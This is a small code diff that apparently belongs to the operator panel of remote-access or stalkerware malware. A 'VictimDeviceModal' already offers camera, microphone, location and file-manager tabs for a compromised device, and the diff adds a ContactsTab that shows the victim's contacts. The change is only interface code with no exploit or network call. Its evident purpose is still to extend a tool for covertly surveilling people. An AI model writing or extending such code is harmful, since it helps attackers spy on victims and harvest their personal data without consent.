@@ -27,6 +27,7 @@ import React, { useState } from 'react';
 import { VictimOrder } from '../../../common/enums';
 import { type VictimDeviceStore } from '../../store/VictimDeviceStore';
 import { CameraTab } from './CameraTab';
+import { ContactsTab } from './ContactsTab';
 import { FileManagerTab } from './FileManagerTab';
 import { LocationTab } from './LocationTab';
 import { MicrophoneTab } from './MicrophoneTab';
@@ -126,6 +127,8 @@ export const VictimDeviceModal: React.FC<IProps> = observer((props) => {
                                 <MicrophoneTab data={props.data} />
                             ) : selectedTab === VictimOrder.LOCATION ? (
                                 <LocationTab data={props.data} />
+                            ) : selectedTab === VictimOrder.CONTACTS ? (
+                                <ContactsTab data={props.data} />
                             ) : null)}
                     </DialogContent>
                 </DialogBody>
